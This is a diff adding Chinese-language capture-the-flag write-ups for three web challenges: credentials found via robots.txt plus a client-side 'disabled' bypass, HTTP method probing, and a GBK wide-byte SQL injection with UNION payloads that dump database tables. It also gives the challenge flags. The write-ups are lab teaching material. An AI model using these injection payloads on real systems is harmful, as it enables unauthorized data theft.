@@ -1367,25 +1367,47 @@ base64 解码即可。
 
 *📌Question :*
 
+```text
+学习HTML吧
+```
 
+![13-01](./images/img-20260929022632_msedge_compressed.jpg)
 
 
 
 *📌Solution :*
 
+尝试访问 `/robots.txt` ，根据里面内容，再去访问 `/robotx.txt` 拿到账号密码：
 
+```text
+username=adminroot
+password=112233
+
+# RobotX credential stash
+```
+
+回到首页，登录，点 flag.txt 的 open，右侧提示改 **dom 元素属性**。
+
+那么在“OPEN [LOCKED]”按钮上右键——检查，找到图中这一行代码，把两个带 `disable` 关键词的属性都删掉：
+
+![13-02](./images/img-20260929023210_msedge_compressed.jpg)
+
+回车，发现按钮可点击了，点击即可。
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{ddd28f3b-42bb-4fa2-9933-bf50e49d315c}`
 
 
 
 *📌Summary :*
 
-
+- 随手扫 `robots.txt` 文件。
+- 只是前端用 html 的 `disabled` 属性把按钮锁住了，但后端并没有真正校验权限。
+- 网页 DOM 元素可直接在浏览器中修改和热更新。
+- 对 HTML 属性的基本了解。
 
 ---
 
@@ -1393,25 +1415,46 @@ base64 解码即可。
 
 *📌Question :*
 
+```text
+一个会"说话"的 Web 服务,只有用对的方式敲门它才会告诉你下一步。
+```
 
+![14-01](./images/img-20260929024010_msedge_compressed.jpg)
 
 
 
 *📌Solution :*
 
+ctrl+u 看源码，发现前面多了注释：
 
+```html
+<!-- Step 2: PUT / -->Welcome, explorer. But GET is not enough... Try other methods.
+```
+
+就是提示第二步要用 PUT 方法请求。
+
+在 hackbar 中切换到 raw 模式，load 一下，把请求头里的 GET 改为 PUT，点击 EXECUTE。
+
+然后观察右侧响应，发现200成功，并提示第三步要发 post 请求到 /probe，并且要带 cookie 和一个特殊的头。
+
+![14-02](./images/img-20260929025008_msedge_compressed.jpg)
+
+回到 basic 模式，按要求发送 post 请求，即可。
+
+![14-03](./images/img-20260929025905_msedge_compressed.jpg)
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{778cc056-af81-4576-8188-467b6fa60630}`
 
 
 
 *📌Summary :*
 
-
+- HTTP 方法：常见有 `GET`（拿东西）、`POST`（提交东西）、`PUT`（放东西/更新）、`DELETE`（删东西）、`HEAD`（只要头不要正文）、`OPTIONS`（问服务器支持哪些方法）。
+- Hackbar 灰常滴好用。
 
 ---
 
@@ -1419,25 +1462,79 @@ base64 解码即可。
 
 *📌Question :*
 
+```text
+审计时翻出一套十年前的客户拜访查询系统，前端升过级，后端一直没人动。 里面有一张遗留的报价表，表名字段名都是当年的老命名。 保护好自己——那个年代的东西，没那么直白。
+```
 
+![15-01](./images/img-20260929030308_msedge_compressed.jpg)
 
 
 
 *📌Solution :*
 
+一看这又是某种 sql 注入。
 
+正常查一下：输入“星环信息”，点击查询后，调试信息里会显示实际执行的 sql 语句，这是大好事儿。
+
+```sql
+SELECT id, corp, contact, city FROM visits WHERE corp = '星环信息' LIMIT 1
+```
+
+输入 `1'` 试一下，发现单引号前面被加上了反斜杠：`... corp = '1\'' LIMIT 1` 。联想到网页里“遗留老系统”的提示，查询相关资料得知，后端大概率是 `addslashes` 过滤，可利用 **GBK 宽字节 SQL 注入**。尝试输入：
+
+```sql
+'運' union select 1,2,3,4-- 
+```
+
+点查询后，输出的表格里确实是 1、2、3、4，证明此方法可行。
+
+枚举表：
+
+```sql
+'運' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()-- 
+```
+
+查询得到：`secret_deals,visits`
+
+- `visits`：界面正在用的拜访表（已知）。
+- `secret_deals`：遗留的报价表（未知、老命名）。
+
+枚举字段：
+
+```sql
+'運' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database()   and table_name=0x7365637265745f6465616c73-- 
+```
+
+- `0x736...` 这是 `secret_deals` 的十六进制，避免引号再被过滤。
+
+查询得到：`id,deal_name,amount`
+
+payload：
+
+```sql
+'運' union select 1,concat(id,deal_name,amount),3,4 from secret_deals-- 
+```
+
+![15-02](./images/img-20260929040214_msedge_compressed.jpg)
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{de2f18dd-b7dc-42e0-9e5f-c07cac66c274}`
 
 
 
 *📌Summary :*
 
-
+- 老 PHP 时代常见防护：`addslashes($input)`，把 `'` `"` `\` `NUL` 前面加 `\`。
+- **宽字节注入：**
+  - GBK 编码里，很多字节序列是**两字节一个汉字**（首字节 `0x81–0xFE`，次字节 `0x40–0xFE`）。
+  - 攻击者发送 `%df%27`（即字节 `0xDF 0x27`）：
+    1. `addslashes` 只看见 `0x27`（`'`），在它前面加 `0x5C`（`\`）→ 变成 `0xDF 0x5C 0x27`；
+    2. MySQL 用 GBK 解析字符串时，把 `0xDF 0x5C` **当成一个汉字**；
+    3. 于是 `0x27`（`'`）**不再被当作转义**，成为真正的引号定界符。
+  - 结果：`WHERE corp = '運' or 1=1#` —— 引号逃逸，注入成功。
 
 ---
 
